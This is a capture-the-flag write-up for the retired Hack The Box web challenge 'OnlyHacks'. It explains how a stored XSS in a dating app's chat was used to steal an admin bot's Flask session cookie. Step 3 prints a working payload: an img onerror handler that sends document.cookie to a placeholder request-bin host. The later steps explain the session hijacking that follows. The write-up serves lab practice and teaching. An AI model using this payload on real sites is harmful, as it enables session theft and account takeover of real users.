---
challenge: OnlyHacks
category: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, xss, cookie-stealing, session-hijack, flask]
---

# OnlyHacks — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no real flags.

## TL;DR

A dating app with chat. Messages are **not sanitised**: stored XSS. A bot holding an admin session reviews the conversation every few seconds, so a payload that sends `document.cookie` to a request bin hands over her **Flask session cookie**; swap it and you are in her account.

## Evidence

- A web instance (register with username, password and avatar).

## Method

1. **Register**: create an account and upload an avatar (otherwise registration complains about a duplicate user).
2. **Confirm the XSS**: send `<img src=x onerror=alert(1)>` in the chat; if the dialog pops in your own browser, it executes.
3. **Steal the cookie**: stand up an endpoint (RequestBin/Pipedream) and send

```html
<img src="x" onerror="fetch('https://<your-bin>/?c='+document.cookie)">
```

4. **Wait for the bot**: the admin replies on a timer; when she renders the message, the request reaches the bin with `session=<base64>.<signature>`.
5. **Impersonate**: DevTools → Application → Cookies, replace your session with the stolen one and reload; her conversation holds the flag.

## Pitfalls

- **httpOnly cookie**: an `httpOnly` cookie could not be read by JavaScript; this one is not.
- **Slow bot**: 5-10 seconds per cycle; do not resend the payload in a loop.
- **Flask signature**: the cookie base64-decodes, but without the `SECRET_KEY` it cannot be forged; steal it, do not build it.

## Lessons

- Stored XSS plus a privileged bot is account takeover, not just a popup.
- Session cookies without `httpOnly` are readable by JavaScript.
- A `fetch` to an external domain exfiltrates data without needing images.
